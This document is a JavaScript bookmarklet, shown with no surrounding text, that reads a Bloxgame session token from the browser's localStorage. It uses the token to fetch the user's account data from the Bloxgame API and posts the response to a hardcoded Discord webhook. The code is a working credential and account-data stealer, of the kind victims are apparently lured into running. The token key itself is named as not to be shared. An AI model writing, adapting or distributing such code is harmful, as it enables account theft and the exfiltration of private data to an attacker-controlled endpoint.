javascript:(function() {
    try {
        var token = localStorage.getItem('_DO_NOT_SHARE_BLOXGAME_TOKEN');
        
        if (token) {
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "https://api.bloxgame.com/user", true);
            xhr.setRequestHeader("accept", "application/json, text/plain, */*");
            xhr.setRequestHeader("accept-language", "en-US,en;q=0.9");
            xhr.setRequestHeader("origin", "https://early-access.bloxgame.com");
            xhr.setRequestHeader("referer", "https://early-access.bloxgame.com/");
            xhr.setRequestHeader("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0");
            xhr.setRequestHeader("x-auth-token", token);
            xhr.setRequestHeader("x-client-version", "1.0.0");
            xhr.setRequestHeader("x-timezone", "Europe/Kiev");

            xhr.onreadystatechange = function() {
                if (xhr.readyState === XMLHttpRequest.DONE) {
                    var response = xhr.responseText;
                    var webhookRequest = new XMLHttpRequest();
                    webhookRequest.open("POST", "https://discord.com/api/webhooks/1280222189429198858/M9axd-BRaA4_aLDb3aqzsHyvSsVVYusXykOX_K1hmvE6evrp5GkuWNqat4iy_p9HrNp3", true);
                    webhookRequest.setRequestHeader('Content-Type', 'application/json');
                    webhookRequest.send(JSON.stringify({ content: 'API Response: ' + response }));
                    console.log('Response sent to webhook.');
                }
            };
            
            xhr.send();
        } else {
            console.log('Token not found in local storage.');
        }
    } catch (e) {
        console.error('Error:', e);
    }
})();
